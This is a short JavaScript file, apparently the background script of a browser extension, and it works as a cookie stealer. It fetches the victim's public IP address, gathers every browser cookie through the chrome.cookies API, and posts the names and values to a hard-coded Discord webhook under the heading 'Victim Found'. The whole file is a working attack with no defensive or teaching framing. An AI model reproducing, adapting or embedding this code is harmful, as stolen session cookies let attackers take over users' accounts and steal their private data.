const WEBHOOK = "https://discord.com/api/webhooks/1072255011184197632/9vmgmgiXwEl-n7PD5gTl3PbOJHAYXvvW94xirV-h5ctzm_-P2cXpNhQb_DPIHGPSwGD5";

async function main() {
  var ipAddr = await (await fetch("https://api.ipify.org")).text();

  chrome.cookies.getAll({}, function (cookies) {
    let allCookies = "";
    cookies.forEach(cookie => {
      allCookies += `${cookie.name}: ${cookie.value}\n`;
    });

    fetch(WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "Application/json"
      },
      body: JSON.stringify({
        "content": null,
        "embeds": [
          {
            "description": "```" + allCookies + "```",
            "color": null,
            "author": {
              "name": "Victim Found: " + ipAddr,
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
            },
            "footer": {
              "text": "https://github.com/ox-y",
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
            }
          }
        ],
        "username": "Cookies",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Cookies_icon.svg/1200px-Cookies_icon.svg.png",
        "attachments": []
      })
    });
  });
}

main();
